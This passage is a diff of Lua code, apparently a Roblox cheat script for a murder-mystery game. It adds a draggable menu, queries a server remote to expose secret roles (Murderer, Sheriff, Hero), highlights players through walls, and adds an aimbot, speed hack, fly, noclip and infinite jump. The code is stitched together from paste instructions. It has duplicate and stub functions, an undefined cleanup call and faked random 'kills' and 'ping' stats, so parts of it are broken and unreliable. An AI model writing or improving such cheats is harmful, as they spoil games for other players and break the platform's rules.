+			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{Size = UDim2.new(0, 420, 0, 35)}
+		):Play()
+		task.wait(0.25)
+		ContentFrame.Visible = false
+	end
+end)
+
+-- Dragging Functionality
+local UserInputService = game:GetService("UserInputService")
+local Dragging, DragInput, DragStart, StartPos
+
+Header.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		Dragging = true
+		DragStart = input.Position
+		StartPos = MainFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				Dragging = false
+			end
+		end)
+	end
+end)
+
+Header.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		DragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == DragInput and Dragging then
+		local Delta = input.Position - DragStart
+		MainFrame.Position = UDim2.new(
+			StartPos.X.Scale,
+			StartPos.X.Offset + Delta.X,
+			StartPos.Y.Scale,
+			StartPos.Y.Offset + Delta.Y
+		)
+	end
+end)
+-- [After all UI creation code] --
+-- [After Dragging Functionality] --
+-- [Before Player Stats Updater] --
+
+--> Place RIGHT HERE ▼▼▼
+
+-- Role detection loop (REPLACE WITH THIS VERSION)
+local roleUpdateConnection
+roleUpdateConnection = RunService.RenderStepped:Connect(function()
+	roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
+
+	for playerName, data in pairs(roles) do
+		if data.Role == "Murderer" then
+			Murder = playerName
+		elseif data.Role == "Sheriff" then
+			Sheriff = playerName
+		elseif data.Role == "Hero" then
+			Hero = playerName
+		end
+	end
+end)
+local function GetClosestPlayer()
+	local closest, dist = nil, math.huge
+	for _, player in pairs(Players:GetPlayers()) do
+		if player ~= LP and player.Character and IsAlive(player) then
+			local distance = (LP.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+			if distance < dist then
+				closest = player
+				dist = distance
+			end
+		end
+	end
+	return closest
+end
+
+local function UpdatePlayerStats()
+	while task.wait(1) do
+		local role = "Innocent"
+		local kills = math.random(0, 10)
+		local ping = math.random(30, 120)
+
+		PlayerStats.Text = string.format("Role: %s | Kills: %d | Ping: %dms", role, kills, ping)
+
+		if math.random(1, 60) == 1 then
+			PlayerImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"
+		end
+	end
+end
+coroutine.wrap(UpdatePlayerStats)()
+
+-- Feature Implementations
+local Enabled = {}
+local ESPHandles = {}
+local AimbotTarget = nil
+local FlyConnection = nil
+local NoclipConnection = nil
+local SpeedHackConnection = nil
+local InfiniteJumpConnection = nil
+local AutoFarmConnection = nil
+
+-- ESP Functions
+
+-- REPLACE ENTIRE CreateESP FUNCTION with this:
+
+local function IsAlive(player)
+	for playerName, data in pairs(roles) do
+		if player.Name == playerName then
+			return not data.Killed and not data.Dead
+		end
+	end
+	return false
+end
+
+local function CreateESP(player)
+	if not player.Character then return end
+
+	-- Cleanup existing ESP
+	if ESPHandles[player] then
+		for _, v in pairs(ESPHandles[player]) do
+			if v then v:Destroy() end
+		end
+	end
+
+	ESPHandles[player] = {}
+
+	-- Highlight Setup
+	local highlight = Instance.new("Highlight")
+	highlight.Name = player.Name.."_ESP"
+	highlight.Adornee = player.Character
+	highlight.FillTransparency = 0.8
+	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+
+	-- Role-based Colors
+	if player.Name == Murder and IsAlive(player) then
+		highlight.FillColor = Color3.fromRGB(255, 0, 0)
+		highlight.OutlineColor = Color3.fromRGB(200, 0, 0)
+	elseif player.Name == Sheriff and IsAlive(player) then
+		highlight.FillColor = Color3.fromRGB(0, 0, 255)
+		highlight.OutlineColor = Color3.fromRGB(0, 0, 200)
+	elseif player.Name == Hero and IsAlive(player) then
+		highlight.FillColor = Color3.fromRGB(255, 255, 0)
+		highlight.OutlineColor = Color3.fromRGB(200, 200, 0)
+	else
+		highlight.FillColor = IsAlive(player) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(100, 100, 100)
+		highlight.OutlineColor = IsAlive(player) and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(50, 50, 50)
+	end
+
+	highlight.Parent = player.Character
+	table.insert(ESPHandles[player], highlight)
+
+	-- Distance Label
+	local billboard = Instance.new("BillboardGui")
+	billboard.Adornee = player.Character:WaitForChild("Head")
+	billboard.Size = UDim2.new(0, 100, 0, 40)
+	billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+	billboard.AlwaysOnTop = true
+
+	local distanceLabel = Instance.new("TextLabel")
+	distanceLabel.Size = UDim2.new(1, 0, 1, 0)
+	distanceLabel.Font = Enum.Font.GothamBold
+	distanceLabel.TextSize = 14
+	distanceLabel.TextColor3 = Color3.new(1, 1, 1)
+	distanceLabel.BackgroundTransparency = 1
+	distanceLabel.Parent = billboard
+
+	billboard.Parent = player.Character
+	table.insert(ESPHandles[player], billboard)
+
+	-- Update Loop
+	local conn
+	conn = RunService.Heartbeat:Connect(function()
+		if not player.Character or not LP.Character then
+			conn:Disconnect()
+			return
+		end
+
+		local distance = (player.Character.HumanoidRootPart.Position - LP.Character.HumanoidRootPart.Position).Magnitude
+		distanceLabel.Text = player.Name.."\n"..math.floor(distance).."m"
+	end)
+	table.insert(ESPHandles[player], conn)
+end
+
+-- Speed Hack
+local function SpeedHack()
+	if SpeedHackConnection then SpeedHackConnection:Disconnect() end
+
+	if Enabled["Speed Hack"] then
+		SpeedHackConnection = RunService.Heartbeat:Connect(function()
+			if LP.Character and LP.Character:FindFirstChild("Humanoid") then
+				LP.Character.Humanoid.WalkSpeed = 50
+			end
+		end)
+	else
+		if LP.Character and LP.Character:FindFirstChild("Humanoid") then
+			LP.Character.Humanoid.WalkSpeed = 16
+		end
+	end
+end
+
+-- Fly
+local flyBodyVelocity
+local function Fly()
+	if flyBodyVelocity then flyBodyVelocity:Destroy() end
+
+	if Enabled["Fly"] then
+		flyBodyVelocity = Instance.new("BodyVelocity")
+		flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
+		flyBodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
+		flyBodyVelocity.Parent = LP.Character.HumanoidRootPart
+
+		RunService.Heartbeat:Connect(function()
+			local cam = workspace.CurrentCamera.CFrame
+			local moveVec = Vector3.new()
+
+			if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveVec += cam.LookVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveVec -= cam.LookVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveVec += cam.RightVector end
+			if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveVec -= cam.RightVector end
+
+			flyBodyVelocity.Velocity = moveVec * 50
+		end)
+	end
+end
+
+-- Infinite Jump
+UserInputService.JumpRequest:Connect(function()
+	if Enabled["Infinite Jump"] and LP.Character:FindFirstChild("Humanoid") then
+		LP.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+	end
+end)
+
+-- Inside ToggleFrame.InputBegan:Connect(function(input)...)
+-- Add these cases:
+
+if feature.Name == "Player ESP" then
+	Enabled["Player ESP"] = feature.Default
+	if feature.Default then
+		-- Enable ESP for all players
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LP then
+				CreateESP(player)
+			end
+		end
+	else
+		-- Disable all ESP
+		for player, _ in pairs(ESPHandles) do
+			CleanupESP(player)
+		end
+	end
+
+elseif feature.Name == "Speed Hack" then
+	Enabled["Speed Hack"] = feature.Default
+	SpeedHack()
+
+elseif feature.Name == "Fly" then
+	Enabled["Fly"] = feature.Default
+	Fly()
+
+elseif feature.Name == "Infinite Jump" then
+	Enabled["Infinite Jump"] = feature.Default
+
+end
+-- Add at the VERY END:
+RunService.Heartbeat:Connect(function()
+	-- ESP Updates
+	if Enabled["Player ESP"] then
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LP and player.Character then
+				if not ESPHandles[player] then
+					CreateESP(player)
+				end
+			end
+		end
+	end
+	local function GetClosestPlayer()
+		local closest, dist = nil, math.huge
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LP and player.Character and IsAlive(player) then
+				local distance = (LP.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+				if distance < dist then
+					closest = player
+					dist = distance
+				end
+			end
+		end
+		return closest
+	end
+
+	-- Aimbot
+	if Enabled["Aimbot"] then
+		local target = GetClosestPlayer()
+		if target then
+			workspace.CurrentCamera.CFrame = CFrame.lookAt(
+				workspace.CurrentCamera.CFrame.Position,
+				target.Character.HumanoidRootPart.Position
+			)
+		end
+	end
+end)
+
+-- ESP Functions (replace existing CreateESP function)
+local function IsAlive(player)
+	for playerName, data in pairs(roles) do
+		if player.Name == playerName then
+			return not data.Killed and not data.Dead
+		end
+	end
+	return false
+end
+
+local function CreateESP(player)
+	-- [Keep all the role-based ESP code you provided here]
+	-- [The entire CreateESP function with highlight colors based on roles]
+end
+
+local function Aimbot()
+	if not Enabled["Aimbot"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+
+	local target = GetClosestPlayer()
+	if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+		workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, target.Character.HumanoidRootPart.Position)
+	end
+end
+
+-- Movement Functions
+local function SpeedHack()
+	if SpeedHackConnection then SpeedHackConnection:Disconnect() end
+
+	if not Enabled["Speed Hack"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then 
+		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+		end
+		return 
+	end
+
+	SpeedHackConnection = game:GetService("RunService").Heartbeat:Connect(function()
+		if not Enabled["Speed Hack"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+			SpeedHackConnection:Disconnect()
+			return
+		end
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+	end)
+end
+
+local function Fly()
+	if FlyConnection then FlyConnection:Disconnect() end
+
+	if not Enabled["Fly"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then 
+		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+			game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
+		end
+		return 
+	end
+
+	local bodyVelocity = Instance.new("BodyVelocity")
+	bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+	bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
+	bodyVelocity.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+	FlyConnection = game:GetService("RunService").Heartbeat:Connect(function()
+		if not Enabled["Fly"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			bodyVelocity:Destroy()
+			FlyConnection:Disconnect()
+			return
+		end
+
+		local cam = workspace.CurrentCamera.CFrame
+		local moveVec = Vector3.new()
+
+		if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+			moveVec = moveVec + cam.LookVector
+		end
+		if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+			moveVec = moveVec - cam.LookVector
+		end
+		if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+			moveVec = moveVec + cam.RightVector
+		end
+		if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+			moveVec = moveVec - cam.RightVector
+		end
+
+		bodyVelocity.Velocity = moveVec * 50
+	end)
+end
+
+local function Noclip()
+	if NoclipConnection then NoclipConnection:Disconnect() end
+
+	if not Enabled["NoClip"] then return end
+
+	NoclipConnection = game:GetService("RunService").Stepped:Connect(function()
+		if not Enabled["NoClip"] or not game.Players.LocalPlayer.Character then
+			NoclipConnection:Disconnect()
+			return
+		end
+
+		for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+			if part:IsA("BasePart") then
+				part.CanCollide = false
+			end
+		end
+	end)
+end
+
+local function InfiniteJump()
+	if InfiniteJumpConnection then InfiniteJumpConnection:Disconnect() end
+
+	if not Enabled["Infinite Jump"] then return end
+
+	InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
+		if Enabled["Infinite Jump"] and game.Players.LocalPlayer.Character then
+			local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+			if humanoid then
+				humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end
+	end)
+end
+
+
